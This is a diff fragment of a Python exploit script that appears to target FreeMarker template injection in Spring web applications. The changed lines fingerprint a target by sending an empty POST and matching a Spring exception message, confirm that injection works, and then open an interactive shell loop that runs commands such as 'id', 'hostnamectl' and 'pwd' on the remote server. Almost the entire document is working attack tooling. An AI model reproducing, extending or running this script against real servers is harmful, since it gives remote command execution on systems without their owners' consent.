@@ -38,10 +38,10 @@ except:
     print('[-]Invalid url')
     exit()
 
-header = r.headers
+fr = requests.post(args.url,'')
 
 #Try to see if the website is running FREEMARKER
-if header.get('X-Powered-By') == 'FREEMARKER':
+if 'org.springframework.web.bind.MissingServletRequestParameterException' in fr.text:
     print(f'[+]Url : {args.url} seems to run with FREEMARKER')
 else:
     print(f'[-]Url : {args.url} does not seem to run with FREEMARKER')
@@ -55,7 +55,7 @@ payload_test = requests.post(args.url, data=data_test)
 
 
 if response(payload_test.text).strip() == '$baconed$':
-    print('[+]Injection successfull\n[+]Opening reverse shell')
+    print('[+]Injection successfull\n[+]Opening shell')
 else:
 	#We dont get a response so we close the program
     print("[-]Target does not seem to be injectable...\n[-]Aborting...")
@@ -68,6 +68,7 @@ time_display = now.strftime("%d/%m/%Y %H:%M:%S")
 #open the shell
 print(f'\n[+]Shell opened at {time_display}')	
 print('[+]'+response(inject('id')).strip())
+print("[+]Current version of OS :",response(inject('hostnamectl')).strip())
 print("[+]Current path :",response(inject('pwd')).strip())
 
 while True:
